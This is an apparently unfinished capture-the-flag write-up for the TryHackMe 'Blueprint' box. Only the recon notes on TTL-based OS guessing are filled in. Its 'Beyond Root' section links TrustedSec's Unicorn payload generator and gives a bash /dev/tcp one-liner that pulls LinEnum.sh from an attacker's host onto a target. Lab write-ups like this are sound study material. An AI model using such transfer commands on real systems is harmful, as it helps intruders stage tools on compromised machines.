# Blueprint Writeup

Name: Blueprint
Date:  
Difficulty:  Easy
Goals:  
- Got root.txt at some point cannot remember this box, but I did not get user.txt
Learnt:
Beyond Root:
- TrustedSec's Unicorn 
- msDOS-file-transfer-dreams 

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Blueprint/Screenshots/ping.png)

guestusersmbaccess.png

## Exploit

## Foothold

## PrivEsc

## Beyond Root - Unicorn and msDOS-file-transfer-dreams 

TrustedSec's Unicorn - https://github.com/trustedsec/unicorn

Powershell or msDOS `echo` version of Ippsec's `cat` file tranfer for windows! Wow what a file transfer, I have not seen this on any OSCP cheatsheets! - findstr would be obvious choice but I really want and echo version.
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```

Yes I know of the vbget line-by-line, but I really just want a hacky version of the above. 
```powershell
```